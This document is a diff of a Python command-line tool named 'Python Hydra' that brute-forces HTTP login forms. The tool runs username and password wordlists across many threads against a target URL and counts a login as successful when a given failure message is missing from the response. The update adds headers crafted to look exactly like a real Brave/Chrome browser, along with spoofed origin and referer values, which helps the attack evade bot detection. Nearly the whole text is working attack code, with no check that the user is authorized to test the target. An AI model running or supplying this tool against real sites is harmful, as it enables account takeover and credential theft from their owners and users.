@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
 Python Hydra - HTTP Authentication Brute Force Tool
-A professional and dynamic tool for penetration testing HTTP authentication systems.
+A professional and powerful tool for penetration testing HTTP authentication systems.
 
 Author: Abdikafi Isse Isak (miirshe)
 Email: miirshe@gmail.com
-Version: 1.0.0
+Version: 2.0.0
 License: MIT
 """
 
@@ -15,11 +15,11 @@ import json
 import time
 import random
 import sys
-from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 from typing import Dict, List, Optional, Tuple
 import os
+from urllib.parse import urlparse
 
 class PythonHydra:
     """Main class for Python Hydra HTTP authentication brute forcing."""
@@ -35,7 +35,7 @@ class PythonHydra:
         # Setup logging
         self.setup_logging()
         
-        # Setup session
+        # Setup session with strong headers
         self.setup_session()
     
     def setup_logging(self):
@@ -51,32 +51,46 @@ class PythonHydra:
         self.logger = logging.getLogger(__name__)
     
     def setup_session(self):
-        """Setup HTTP session with default headers and cookies."""
-        # Default headers that look more legitimate
-        default_headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate, br",
-            "DNT": "1",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "none",
-            "Sec-Fetch-User": "?1",
-            "Cache-Control": "max-age=0"
+        """Setup HTTP session with strong, realistic headers."""
+        # Strong headers that look exactly like a real browser
+        strong_headers = {
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+            "accept-language": "en-US,en;q=0.9",
+            "cache-control": "max-age=0",
+            "content-type": "application/x-www-form-urlencoded",
+            "sec-ch-ua": '"Not;A=Brand";v="99", "Brave";v="139", "Chromium";v="139"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-user": "?1",
+            "sec-gpc": "1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
         }
         
         # Update with custom headers if provided
         if 'headers' in self.config:
-            default_headers.update(self.config['headers'])
+            strong_headers.update(self.config['headers'])
         
-        self.session.headers.update(default_headers)
+        self.session.headers.update(strong_headers)
         
         # Set cookies if provided
         if 'cookies' in self.config:
             self.session.cookies.update(self.config['cookies'])
+        
+        # Set origin and referer if target URL is provided
+        if 'target' in self.config:
+            target_url = self.config['target']
+            parsed_url = urlparse(target_url)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+            
+            strong_headers.update({
+                "origin": base_url,
+                "referer": target_url
+            })
+            self.session.headers.update(strong_headers)
     
     def load_wordlist(self, wordlist_path: str) -> List[str]:
         """Load wordlist from file."""
@@ -103,10 +117,8 @@ class PythonHydra:
             # Treat as comma-separated usernames
             return [u.strip() for u in username_input.split(',') if u.strip()]
     
-    def test_credentials(self, url: str, username: str, password: str, 
-                        form_data: Dict, success_indicators: List[str], 
-                        failure_indicators: List[str]) -> Tuple[bool, str]:
-        """Test a single username/password combination."""
+    def try_login(self, url: str, username: str, password: str, form_data: Dict, failure_message: str) -> Tuple[bool, str]:
+        """Try to login with username/password - simple and direct like your working code."""
         try:
             # Prepare form data
             data = form_data.copy()
@@ -119,7 +131,7 @@ class PythonHydra:
             if self.config.get('delay', 0) > 0:
                 time.sleep(random.uniform(0.1, self.config['delay']))
             
-            # Make request
+            # Make request with strong session
             response = self.session.post(
                 url, 
                 data=data, 
@@ -129,14 +141,11 @@ class PythonHydra:
             
             self.total_attempts += 1
             
-            # Check for failure indicators FIRST (like your working code)
-            for indicator in failure_indicators:
-                if indicator.lower() in response.text.lower():
-                    return False, f"Failure indicator found: {indicator}"
-            
-            # If no failure indicators found, it's likely a success
-            # This matches your working approach: "if 'Username or Password is invalid' not in response.text"
-            return True, "No failure indicators found (likely success)"
+            # SIMPLE LOGIC: Check if failure message is NOT in response (exactly like your working code)
+            if failure_message.lower() not in response.text.lower():
+                return True, f"Success! Failure message '{failure_message}' not found in response"
+            else:
+                return False, f"Failure message '{failure_message}' found in response"
                 
         except requests.exceptions.RequestException as e:
             self.logger.warning(f"Request failed for {username}:{password} - {e}")
@@ -145,15 +154,13 @@ class PythonHydra:
             self.logger.error(f"Unexpected error: {e}")
             return False, f"Error: {e}"
     
-
-    
     def brute_force(self, url: str, usernames: List[str], passwords: List[str],
-                    form_data: Dict, success_indicators: List[str],
-                    failure_indicators: List[str], max_workers: int = 5) -> None:
+                    form_data: Dict, failure_message: str, max_workers: int = 5) -> None:
         """Perform brute force attack with multiple threads."""
-        self.logger.info(f"\033[94mStarting brute force attack on {url}\033[0m")
-        self.logger.info(f"\033[94mTesting {len(usernames)} usernames with {len(passwords)} passwords\033[0m")
-        self.logger.info(f"\033[94mTotal combinations: {len(usernames) * len(passwords)}\033[0m")
+        self.logger.info(f"\033[94m🚀 Starting brute force attack on {url}\033[0m")
+        self.logger.info(f"\033[94m👥 Testing {len(usernames)} usernames with {len(passwords)} passwords\033[0m")
+        self.logger.info(f"\033[94m🔢 Total combinations: {len(usernames) * len(passwords)}\033[0m")
+        self.logger.info(f"\033[94m❌ Failure message: '{failure_message}'\033[0m")
         
         # Create all combinations
         combinations = [(u, p) for u in usernames for p in passwords]
@@ -162,11 +169,10 @@ class PythonHydra:
             # Submit all tasks
             future_to_creds = {
                 executor.submit(
-                    self.test_credentials, 
+                    self.try_login, 
                     url, u, p, 
                     form_data, 
-                    success_indicators, 
-                    failure_indicators
+                    failure_message
                 ): (u, p) for u, p in combinations
             }
             
@@ -182,7 +188,7 @@ class PythonHydra:
                             'password': password,
                             'message': message
                         })
-                        self.logger.info(f"\033[92m[+] SUCCESS: {username}:{password} - {message}\033[0m")
+                        self.logger.info(f"\033[92m[+] 🎯 SUCCESS: {username}:{password} - {message}\033[0m")
                         
                         # Stop if we only want first success
                         if self.config.get('stop_on_first', False):
@@ -193,17 +199,17 @@ class PythonHydra:
                         self.logger.debug(f"\033[91m[-] Failed: {username}:{password} - {message}\033[0m")
                         
                         # Progress indicator
-                        if self.total_attempts % 100 == 0:
-                            self.logger.info(f"\033[93mProgress: {self.total_attempts}/{len(combinations)} attempts\033[0m")
+                        if self.total_attempts % 50 == 0:
+                            self.logger.info(f"\033[93m📊 Progress: {self.total_attempts}/{len(combinations)} attempts\033[0m")
                             
                 except Exception as e:
                     self.logger.error(f"Error processing {username}:{password} - {e}")
                     self.failed_attempts += 1
         
-        self.logger.info("\033[95mBrute force attack completed!\033[0m")
-        self.logger.info(f"\033[92mSuccessful attempts: {len(self.successful_credentials)}\033[0m")
-        self.logger.info(f"\033[91mFailed attempts: {self.failed_attempts}\033[0m")
-        self.logger.info(f"\033[93mTotal attempts: {self.total_attempts}\033[0m")
+        self.logger.info("\033[95m🏁 Brute force attack completed!\033[0m")
+        self.logger.info(f"\033[92m✅ Successful attempts: {len(self.successful_credentials)}\033[0m")
+        self.logger.info(f"\033[91m❌ Failed attempts: {self.failed_attempts}\033[0m")
+        self.logger.info(f"\033[93m📈 Total attempts: {self.total_attempts}\033[0m")
     
     def save_results(self, output_file: str = None):
         """Save results to file."""
@@ -223,9 +229,9 @@ class PythonHydra:
         try:
             with open(output_file, 'w') as f:
                 json.dump(results, f, indent=2)
-            self.logger.info(f"\033[92mResults saved to {output_file}\033[0m")
+            self.logger.info(f"\033[92m💾 Results saved to {output_file}\033[0m")
         except Exception as e:
-            self.logger.error(f"\033[91mError saving results: {e}\033[0m")
+            self.logger.error(f"\033[91m❌ Error saving results: {e}\033[0m")
 
 def load_config(config_file: str) -> Dict:
     """Load configuration from JSON file."""
@@ -239,14 +245,12 @@ def load_config(config_file: str) -> Dict:
         print(f"Invalid JSON in config file: {config_file}")
         return {}
 
-
-
 def main():
     """Main function with command line interface."""
     
     # Display author information with colors
     print("\033[95m" + "="*60 + "\033[0m")
-    print("\033[96m" + "🐍 Python Hydra - HTTP Authentication Brute Force Tool" + "\033[0m")
+    print("\033[96m" + "🐍 Python Hydra v2.0 - STRONG HTTP Auth Brute Force" + "\033[0m")
     print("\033[95m" + "="*60 + "\033[0m")
     print("\033[93m" + "👨‍💻 Software Engineer | AI, Web & Cybersecurity Enthusiast" + "\033[0m")
     print("\033[92m" + "Author: Abdikafi Isse Isak (miirshe)" + "\033[0m")
@@ -254,34 +258,31 @@ def main():
     print("\033[95m" + "="*60 + "\033[0m\n")
     
     parser = argparse.ArgumentParser(
-        description="Python Hydra - HTTP Authentication Brute Force Tool",
+        description="Python Hydra v2.0 - STRONG HTTP Authentication Brute Force Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  python python_hydra.py -u admin -p pass.txt -t https://example.com/login -f "Invalid credentials"
+  python python_hydra.py -t https://example.com/login -u admin -p pass.txt -f "Invalid credentials"
+  python python_hydra.py -t https://example.com/login -u admin -p pass.txt -f "Login failed" --delay 0.3
   python python_hydra.py -c config.json -U users.txt -P pass.txt
-  python python_hydra.py -u admin -p pass.txt -t https://example.com/login --interactive
         """
     )
     
-    parser.add_argument('-t', '--target', help='Target URL')
+    parser.add_argument('-t', '--target', required=True, help='Target URL (required)')
     parser.add_argument('-u', '--username', help='Username or username file')
     parser.add_argument('-U', '--usernames', help='Username file')
     parser.add_argument('-p', '--password', help='Password file')
     parser.add_argument('-P', '--passwords', help='Password file (alternative)')
     parser.add_argument('-c', '--config', help='Configuration file')
     parser.add_argument('-o', '--output', help='Output file for results')
-    parser.add_argument('-f', '--failure', help='Failure message to detect (e.g., "Username or Password is invalid")')
+    parser.add_argument('-f', '--failure', required=True, help='Failure message to detect (e.g., "Username or Password is invalid")')
 
     parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (seconds)')
     parser.add_argument('--threads', type=int, default=5, help='Number of threads')
     parser.add_argument('--stop-first', action='store_true', help='Stop on first successful login')
-    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive mode to enter failure message')
     parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
     
     args = parser.parse_args()
-    
-
     
     # Setup logging level
     if args.verbose:
@@ -299,23 +300,12 @@ Examples:
         config['max_workers'] = args.threads
     if args.stop_first:
         config['stop_on_first'] = True
-
-    
-    # Validate required arguments
-    if not args.target and 'target' not in config:
-        parser.error("Target URL is required (use -t or config file)")
-    
-    if not args.username and not args.usernames and 'usernames' not in config:
-        parser.error("Username(s) are required (use -u/-U or config file)")
-    
-    if not args.password and not args.passwords and 'passwords' not in config:
-        parser.error("Password file is required (use -p/-P or config file)")
     
     # Initialize Python Hydra
     hydra = PythonHydra(config)
     
     # Get target information
-    target_url = args.target or config['target']['url']
+    target_url = args.target
     
     # Get usernames
     if args.username:
@@ -323,57 +313,32 @@ Examples:
     elif args.usernames:
         usernames = hydra.load_usernames(args.usernames)
     else:
-        usernames = config.get('usernames', [])
+        usernames = config.get('usernames', ['admin'])  # Default username
     
     # Get passwords
     password_file = args.password or args.passwords or config.get('passwords', 'pass.txt')
     passwords = hydra.load_wordlist(password_file)
     
     if not usernames or not passwords:
-        print("Error: No usernames or passwords loaded")
+        print("❌ Error: No usernames or passwords loaded")
         return
     
-    # Get form data and indicators
+    # Get form data
     if 'target' in config:
         form_data = config['target'].get('form_data', {})
-        success_indicators = config['target'].get('success_indicators', [])
-        failure_indicators = config['target'].get('failure_indicators', [])
     else:
         # Basic form data
         form_data = {'username': '', 'password': ''}
-        success_indicators = []
-        failure_indicators = []
     
-    # Set failure message from command line or interactive mode
-    if args.failure:
-        failure_indicators = [args.failure]
-        print(f"\033[92m✓ Failure message set to: '{args.failure}'\033[0m")
-    elif args.interactive or not failure_indicators:
-        print("\n\033[93m" + "="*50 + "\033[0m")
-        print("\033[96m" + "🔍 INTERACTIVE FAILURE MESSAGE SETUP" + "\033[0m")
-        print("\033[93m" + "="*50 + "\033[0m")
-        
-        print("\n\033[94mTo find the correct failure message:\033[0m")
-        print("1. Try logging in with wrong credentials manually")
-        print("2. Look for error messages like 'Invalid password', 'Login failed', etc.")
-        print("3. Copy the exact text that appears when login fails\n")
-        
-        # Get failure message from user
-        failure_message = input("\033[92mEnter the exact failure message: \033[0m").strip()
-        
-        if failure_message:
-            failure_indicators = [failure_message]
-            print(f"\033[92m✓ Failure message set to: '{failure_message}'\033[0m")
-        else:
-            print("\033[91m✗ No failure message entered. Using defaults.\033[0m")
-        
-        print("\033[93m" + "="*50 + "\033[0m\n")
+    # Set failure message
+    failure_message = args.failure
+    print(f"\033[92m✅ Failure message set to: '{failure_message}'\033[0m")
     
     # Start brute force attack
     try:
         hydra.brute_force(
             target_url, usernames, passwords, form_data,
-            success_indicators, failure_indicators,
+            failure_message,
             max_workers=config.get('max_workers', 5)
         )
         
@@ -383,22 +348,22 @@ Examples:
         # Display results
         if hydra.successful_credentials:
             print("\n" + "\033[95m" + "="*50 + "\033[0m")
-            print("\033[92m" + "SUCCESSFUL CREDENTIALS FOUND:" + "\033[0m")
+            print("\033[92m" + "🎯 SUCCESSFUL CREDENTIALS FOUND:" + "\033[0m")
             print("\033[95m" + "="*50 + "\033[0m")
             for cred in hydra.successful_credentials:
-                print(f"\033[96mUsername: {cred['username']}\033[0m")
-                print(f"\033[96mPassword: {cred['password']}\033[0m")
-                print(f"\033[96mMessage: {cred['message']}\033[0m")
+                print(f"\033[96m👤 Username: {cred['username']}\033[0m")
+                print(f"\033[96m🔑 Password: {cred['password']}\033[0m")
+                print(f"\033[96m💬 Message: {cred['message']}\033[0m")
                 print("\033[93m" + "-" * 30 + "\033[0m")
         else:
-            print("\n\033[91mNo successful logins found.\033[0m")
+            print("\n\033[91m❌ No successful logins found.\033[0m")
             
     except KeyboardInterrupt:
-        print("\n\033[93mAttack interrupted by user\033[0m")
+        print("\n\033[93m⚠️ Attack interrupted by user\033[0m")
         hydra.save_results(args.output)
     except Exception as e:
-        print(f"\033[91mError during attack: {e}\033[0m")
-        logging.error(f"\033[91mAttack failed: {e}\033[0m")
+        print(f"\033[91m❌ Error during attack: {e}\033[0m")
+        logging.error(f"\033[91m❌ Attack failed: {e}\033[0m")
 
 if __name__ == "__main__":
     main()
